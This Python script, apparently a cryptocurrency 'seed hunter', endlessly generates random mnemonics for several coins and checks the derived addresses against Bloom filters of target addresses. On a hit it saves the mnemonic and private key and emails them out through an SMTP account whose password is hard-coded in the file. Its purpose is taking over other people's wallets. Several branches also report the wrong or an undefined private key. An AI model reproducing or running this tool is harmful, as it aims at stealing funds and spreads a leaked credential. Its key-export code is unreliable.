# #!/usr/bin/python3
# encoding=utf8
# -*- coding: utf-8 -*-
import smtplib
from bip_utils import Bip32, Bip32Utils, Bip44, Bip44Coins, Bip44Changes
from bloomfilter import BloomFilter
from mnemonic import Mnemonic
import sys
import argparse
import time


version:str = ' Pulsar v2.7 '
mnemonic_lang:list = ['english', 'chinese_simplified', 'french', 'spanish']
fl_44:list = ['ltc.bf','dash.bf','eth.bf','doge.bf','cash.bf','sv.bf','btc.bf']
fl_32:list = ['btc.bf', 'sv.bf','cash-legacy.bf']


def createParser ():
    parser = argparse.ArgumentParser(description='select bip')
    parser.add_argument ('-b', '--bip', action='store', type=int, help='32 or 44, default bip32', default='32')
    parser.add_argument ('-d', '--dir_bf', action='store', type=str, help='directories to BF', default='bf')
    return parser.parse_args().bip, parser.parse_args().dir_bf


def send_email(text):
    host:str = "smtp.timeweb.ru"
    password:str = 'Vfhbyfl66$'
    subject:str = "--- Find Mnemonic ---"
    to_addr:str = "info@quadrotech.ru"
    from_addr:str = "info@quadrotech.ru"
    BODY:str = "\r\n".join(("From: %s" % from_addr, "To: %s" % to_addr, "Subject: %s" % subject, "", text)).encode('utf-8')
    server = smtplib.SMTP(host,25)
    server.login(from_addr, password)
    try:
        server.sendmail(from_addr, [to_addr], BODY)
    except UnicodeError:
        print('\n'+'Error Encode UTF-8')
    finally:
        server.quit()


def save_rezult(text:str):
    try:
        f_rez = open('rezult.txt', 'a', encoding="utf-8")
    except FileNotFoundError:
        print('\n'+'Файл rezult.txt не найден.')
    else:
        try:
            tf:str = text+'\n'
            f_rez.write(tf)
        except UnicodeError:
            print('\n'+'Error Encode UTF-8')
        finally:
            f_rez.close()


def work32():
    for mem in mnemonic_lang:
        mnemo = Mnemonic(mem)
        mnemonic:str = mnemo.generate(strength=128)
        seed_bytes:bytes = mnemo.to_seed(mnemonic, passphrase="")
        bip32_ctx = Bip32.FromSeed(seed_bytes)

        for num in range(20):
            bip32_ctx_ex = bip32_ctx.DerivePath("0'/0'/" + str(num))  # Bitcoin Core address primary m/0'/0'/0
            bip32_addr:str = bip32_ctx_ex.PublicKey().ToAddress()
            if bip32_addr in bf_btc:
                print('============== Find =================')
                bip32_PK = bip32_ctx.PrivateKey().ToWif()
                res:str = bip32_addr + ' | TRUE | ' + mnemonic + ' | ' + bip32_PK +' | BTC'
                print(res)
                save_rezult(res)
                send_email(res)
            if bip32_addr in bf_cash:
                print('============== Find =================')
                bip32_PK = bip32_ctx.PrivateKey().ToWif()
                res:str = bip32_addr + ' | TRUE | ' + mnemonic + ' | ' + bip32_PK +' | CASH'
                print(res)
                save_rezult(res)
                send_email(res)
            if bip32_addr in bf_sv:
                print('============== Find =================')
                bip32_PK = bip32_ctx.PrivateKey().ToWif()
                res:str = bip32_addr + ' | TRUE | ' + mnemonic + ' | ' + bip32_PK +' | SV'
                print(res)
                save_rezult(res)
                send_email(res)
        # print("------------------------------------------------------")
        for num in range(20):
            bip32_ctx_ex = bip32_ctx.DerivePath("0'/0'/" + str(num) + "'")  # Bitcoin Core hardened addresses primary m/0'/0'/0'
            bip32_addr:str = bip32_ctx_ex.PublicKey().ToAddress()
            if bip32_addr in bf_btc:
                print('============== Find =================')
                bip32_PK = bip32_ctx.PrivateKey().ToWif()
                res:str = bip32_addr + ' | TRUE | ' + mnemonic + ' | ' + bip32_PK +' | BTC'
                print(res)
                save_rezult(res)
                send_email(res)
            if bip32_addr in bf_cash:
                print('============== Find =================')
                bip32_PK = bip32_ctx.PrivateKey().ToWif()
                res:str = bip32_addr + ' | TRUE | ' + mnemonic + ' | ' + bip32_PK +' | CASH'
                print(res)
                save_rezult(res)
                send_email(res)
            if bip32_addr in bf_sv:
                print('============== Find =================')
                bip32_PK = bip32_ctx.PrivateKey().ToWif()
                res:str = bip32_addr + ' | TRUE | ' + mnemonic + ' | ' + bip32_PK +' | SV'
                print(res)
                save_rezult(res)
                send_email(res)
        # print("------------------------------------------------------")
        for num in range(20):
            bip32_ctx_ex = bip32_ctx.DerivePath("0'/0/" + str(num))  # Miltibit HD address
            bip32_addr:str = bip32_ctx_ex.PublicKey().ToAddress()
            if bip32_addr in bf_btc:
                print('============== Find =================')
                bip32_PK = bip32_ctx.PrivateKey().ToWif()
                res:str = bip32_addr + ' | TRUE | ' + mnemonic + ' | ' + bip32_PK +' | BTC'
                print(res)
                save_rezult(res)
                send_email(res)
            if bip32_addr in bf_cash:
                print('============== Find =================')
                bip32_PK = bip32_ctx.PrivateKey().ToWif()
                res:str = bip32_addr + ' | TRUE | ' + mnemonic + ' | ' + bip32_PK +' | CASH'
                print(res)
                save_rezult(res)
                send_email(res)
            if bip32_addr in bf_sv:
                print('============== Find =================')
                bip32_PK = bip32_ctx.PrivateKey().ToWif()
                res:str = bip32_addr + ' | TRUE | ' + mnemonic + ' | ' + bip32_PK +' | SV'
                print(res)
                save_rezult(res)
                send_email(res)
        # print("------------------------------------------------------")
        for num in range(20):
            bip32_ctx_ex = bip32_ctx.DerivePath("0'/0/" + str(num) + "'")  # Miltibit HD address
            bip32_addr:str = bip32_ctx_ex.PublicKey().ToAddress()
            if bip32_addr in bf_btc:
                print('============== Find =================')
                bip32_PK = bip32_ctx.PrivateKey().ToWif()
                res:str = bip32_addr + ' | TRUE | ' + mnemonic + ' | ' + bip32_PK +' | BTC'
                print(res)
                save_rezult(res)
                send_email(res)
            if bip32_addr in bf_cash:
                print('============== Find =================')
                bip32_PK = bip32_ctx.PrivateKey().ToWif()
                res:str = bip32_addr + ' | TRUE | ' + mnemonic + ' | ' + bip32_PK +' | CASH'
                print(res)
                save_rezult(res)
                send_email(res)
            if bip32_addr in bf_sv:
                print('============== Find =================')
                bip32_PK = bip32_ctx.PrivateKey().ToWif()
                res:str = bip32_addr + ' | TRUE | ' + mnemonic + ' | ' + bip32_PK +' | SV'
                print(res)
                save_rezult(res)
                send_email(res)
        # print("------------------------------------------------------")
        for num in range(20):
            bip32_ctx_ex = bip32_ctx.DerivePath("0/" + str(num))  # Miltibit HD hardened addresses
            bip32_addr:str = bip32_ctx_ex.PublicKey().ToAddress()
            if bip32_addr in bf_btc:
                print('============== Find =================')
                bip32_PK = bip32_ctx.PrivateKey().ToWif()
                res:str = bip32_addr + ' | TRUE | ' + mnemonic + ' | ' + bip32_PK +' | BTC'
                print(res)
                save_rezult(res)
                send_email(res)
            if bip32_addr in bf_cash:
                print('============== Find =================')
                bip32_PK = bip32_ctx.PrivateKey().ToWif()
                res:str = bip32_addr + ' | TRUE | ' + mnemonic + ' | ' + bip32_PK +' | CASH'
                print(res)
                save_rezult(res)
                send_email(res)
            if bip32_addr in bf_sv:
                print('============== Find =================')
                bip32_PK = bip32_ctx.PrivateKey().ToWif()
                res:str = bip32_addr + ' | TRUE | ' + mnemonic + ' | ' + bip32_PK +' | SV'
                print(res)
                save_rezult(res)
                send_email(res)
            # print("------------------------------------------------------")
        for num in range(20):
            bip32_ctx_ex = bip32_ctx.DerivePath("44'/0'/0'/" + str(num))  # Miltibit HD hardened addresses
            bip32_addr:str = bip32_ctx_ex.PublicKey().ToAddress()
            if bip32_addr in bf_btc:
                print('============== Find =================')
                bip32_PK = bip32_ctx.PrivateKey().ToWif()
                res:str = bip32_addr + ' | TRUE | ' + mnemonic + ' | ' + bip32_PK +' | BTC'
                print(res)
                save_rezult(res)
                send_email(res)
            if bip32_addr in bf_cash:
                print('============== Find =================')
                bip32_PK = bip32_ctx.PrivateKey().ToWif()
                res:str = bip32_addr + ' | TRUE | ' + mnemonic + ' | ' + bip32_PK +' | CASH'
                print(res)
                save_rezult(res)
                send_email(res)
            if bip32_addr in bf_sv:
                print('============== Find =================')
                bip32_PK = bip32_ctx.PrivateKey().ToWif()
                res:str = bip32_addr + ' | TRUE | ' + mnemonic + ' | ' + bip32_PK +' | SV'
                print(res)
                save_rezult(res)
                send_email(res)
            # print("------------------------------------------------------")
        for num in range(20):
            bip32_ctx_ex = bip32_ctx.DerivePath("44'/236'/0'/" + str(num))  # Miltibit HD hardened addresses
            bip32_addr:str = bip32_ctx_ex.PublicKey().ToAddress()
            if bip32_addr in bf_sv:
                print('============== Find =================')
                bip32_PK = bip32_ctx.PrivateKey().ToWif()
                res:str = bip32_addr + ' | TRUE | ' + mnemonic + ' | ' + bip32_PK +' | SV'
                print(res)
                save_rezult(res)
                send_email(res)
        for num in range(20):
            bip32_ctx_ex = bip32_ctx.DerivePath("44'/145'/0'/" + str(num))  # Miltibit HD hardened addresses
            bip32_addr:str = bip32_ctx_ex.PublicKey().ToAddress()
            if bip32_addr in bf_cash:
                print('============== Find =================')
                bip32_PK = bip32_ctx.PrivateKey().ToWif()
                res:str = bip32_addr + ' | TRUE | ' + mnemonic + ' | ' + bip32_PK +' | CASH'
                print(res)
                save_rezult(res)
                send_email(res)

def work44():
    for mem in mnemonic_lang:
        mnemo = Mnemonic(mem)
        mnemonic:str = mnemo.generate(strength=128)
        seed_bytes:bytes = mnemo.to_seed(mnemonic, passphrase="")

        # btc
        bip_obj_mst = Bip44.FromSeed(seed_bytes, Bip44Coins.BITCOIN)
        bip_obj_acc = bip_obj_mst.Purpose().Coin().Account(0)
        bip_obj_chain = bip_obj_acc.Change(Bip44Changes.CHAIN_EXT)
        for nom in range(20):
            bip_obj_addr = bip_obj_chain.AddressIndex(nom)
            bip_addr:str = bip_obj_addr.PublicKey().ToAddress()
            if bip_addr in bf_btc:
                print('============== Find =================')
                bip44_PK = bip_obj_addr.PrivateKey().ToWif()
                res:str = bip_addr + ' -TRUE - ' + mnemonic + ' | ' + bip44_PK +' | BTC'
                print(res)
                save_rezult(res)
                send_email(res)

        # btc_cash
        bip_obj_mst = Bip44.FromSeed(seed_bytes, Bip44Coins.BITCOIN_CASH)
        bip_obj_acc = bip_obj_mst.Purpose().Coin().Account(0)
        bip_obj_chain = bip_obj_acc.Change(Bip44Changes.CHAIN_EXT)
        for nom in range(20):
            bip_obj_addr = bip_obj_chain.AddressIndex(nom)
            bip_addr:str = bip_obj_addr.PublicKey().ToAddress()[12:]
            if bip_addr in bf_cash:
                print('============== Find =================')
                bip44_PK = bip_obj_addr.PrivateKey().ToWif()
                res:str = bip_addr + ' -TRUE - ' + mnemonic + ' | ' + bip44_PK +' | CASH'
                print(res)
                save_rezult(res)
                send_email(res)
        # ltc
        bip_obj_mst = Bip44.FromSeed(seed_bytes, Bip44Coins.LITECOIN)
        bip_obj_acc = bip_obj_mst.Purpose().Coin().Account(0)
        bip_obj_chain = bip_obj_acc.Change(Bip44Changes.CHAIN_EXT)
        for nom in range(20):
            bip_obj_addr = bip_obj_chain.AddressIndex(nom)
            bip_addr:str = bip_obj_addr.PublicKey().ToAddress()
            if bip_addr in bf_ltc:
                print('============== Find =================')
                bip44_PK = bip_obj_addr.PrivateKey().ToWif()
                res:str = bip_addr + ' -TRUE - ' + mnemonic + ' | ' + bip44_PK +' | LITECOIN'
                print(res)
                save_rezult(res)
                send_email(res)

        # dash
        bip_obj_mst = Bip44.FromSeed(seed_bytes, Bip44Coins.DASH)
        bip_obj_acc = bip_obj_mst.Purpose().Coin().Account(0)
        bip_obj_chain = bip_obj_acc.Change(Bip44Changes.CHAIN_EXT)
        for nom in range(20):
            bip_obj_addr = bip_obj_chain.AddressIndex(nom)
            bip_addr:str = bip_obj_addr.PublicKey().ToAddress()
            if bip_addr in bf_dash:
                print('============== Find =================')
                bip44_PK = bip_obj_addr.PrivateKey().ToWif()
                res:str = bip_addr + ' -TRUE - ' + mnemonic + ' | ' + bip44_PK +' | DASH'
                print(res)
                save_rezult(res)
                send_email(res)

        # ETH
        bip_obj_mst = Bip44.FromSeed(seed_bytes, Bip44Coins.ETHEREUM)
        bip_obj_acc = bip_obj_mst.Purpose().Coin().Account(0)
        bip_obj_chain = bip_obj_acc.Change(Bip44Changes.CHAIN_EXT)
        for nom in range(20):
            bip_obj_addr = bip_obj_chain.AddressIndex(nom)
            bip_addr:str = bip_obj_addr.PublicKey().ToAddress()
            if bip_addr in bf_eth:
                print('============== Find =================')
                bip32_PK = bip_obj_addr.PrivateKey().ToWif()
                res:str = bip_addr + ' -TRUE - ' + mnemonic + ' | ' + bip44_PK +' | ETHEREUM'
                print(res)
                save_rezult(res)
                send_email(res)

        # DOGE
        bip_obj_mst = Bip44.FromSeed(seed_bytes, Bip44Coins.DOGECOIN)
        bip_obj_acc = bip_obj_mst.Purpose().Coin().Account(0)
        bip_obj_chain = bip_obj_acc.Change(Bip44Changes.CHAIN_EXT)
        for nom in range(20):
            bip_obj_addr = bip_obj_chain.AddressIndex(nom)
            bip_addr:str = bip_obj_addr.PublicKey().ToAddress()
            if bip_addr in bf_doge:
                print('============== Find =================')
                bip32_PK = bip_obj_addr.PrivateKey().ToWif()
                res:str = bip_addr + ' -TRUE - ' + mnemonic + ' | ' + bip44_PK +' | DOGECOIN'
                print(res)
                save_rezult(res)
                send_email(res)

        # sv
        bip_obj_mst = Bip44.FromSeed(seed_bytes, Bip44Coins.BITCOIN_SV)
        bip_obj_acc = bip_obj_mst.Purpose().Coin().Account(0)
        bip_obj_chain = bip_obj_acc.Change(Bip44Changes.CHAIN_EXT)
        for nom in range(20):
            bip_obj_addr = bip_obj_chain.AddressIndex(nom)
            bip_addr:str = bip_obj_addr.PublicKey().ToAddress()
            if bip_addr in bf_sv:
                print('============== Find =================')
                bip32_PK = bip_obj_addr.PrivateKey().ToWif()
                res:str = bip_addr + ' -TRUE - ' + mnemonic + ' | ' + bip44_PK +' | BITCOIN_SV'
                print(res)
                save_rezult(res)
                send_email(res)

if __name__ == "__main__":
    bip, dir = createParser()
    if bip == 32:
        print("---------------Load BF---------------")
        for fl in fl_32:
            try:
                fp = open(dir+'/'+fl, "rb")
            except FileNotFoundError:
                print('\n'+'File '+ fl + ' не найден.')
                sys.exit()
            else:
                if fl == 'btc.bf':
                    bf_btc = BloomFilter.load(fp)
                    print('load BF '+fl)
                if fl == 'sv.bf':
                    bf_sv = BloomFilter.load(fp)
                    print('load BF '+fl)
                if fl == 'cash-legacy.bf':
                    bf_cash = BloomFilter.load(fp)
                    print('load BF '+fl)
        ii:int = 1
        print("---------------START "+version+"---------------")
        while ii > 0:
            print('                           ', end='\r')
            print('Циклов {} '.format(ii),end='\r')
            ii +=1
            try:
                work32()
            except KeyboardInterrupt:
                print('\n'+'Прервано пользователем.')
                sys.exit()
    else:
        print("---------------Load BF---------------")
        for fl in fl_44:
            try:
                fp = open(dir+'/'+fl, "rb")
            except FileNotFoundError:
                print('\n'+'File '+ fl + ' не найден.')
                sys.exit()
            else:
                if fl == 'ltc.bf':
                    bf_ltc = BloomFilter.load(fp)
                    print('load BF '+fl)
                if fl == 'dash.bf':
                    bf_dash = BloomFilter.load(fp)
                    print('load BF '+fl)
                if fl == 'eth.bf':
                    bf_eth = BloomFilter.load(fp)
                    print('load BF '+fl)
                if fl == 'doge.bf':
                    bf_doge = BloomFilter.load(fp)
                    print('load BF '+fl)
                if fl == 'cash.bf':
                    bf_cash = BloomFilter.load(fp)
                    print('load BF '+fl)
                if fl == 'sv.bf':
                    bf_sv = BloomFilter.load(fp)
                    print('load BF '+fl)
                if fl == 'btc.bf':
                    bf_btc = BloomFilter.load(fp)
                    print('load BF '+fl)

        ii:int = 1
        print("---------------START "+version+"---------------")
        while ii > 0:
            print('                   ', end='\r')
            print('Цыклов {} '.format(ii),end='\r')
            ii +=1
            try:
                #start_time = time.time()
                work44()
                #print("--- %s seconds ---" % (time.time() - start_time))
            except KeyboardInterrupt:
                print('\n'+'Прервано пользователем.')
                sys.exit()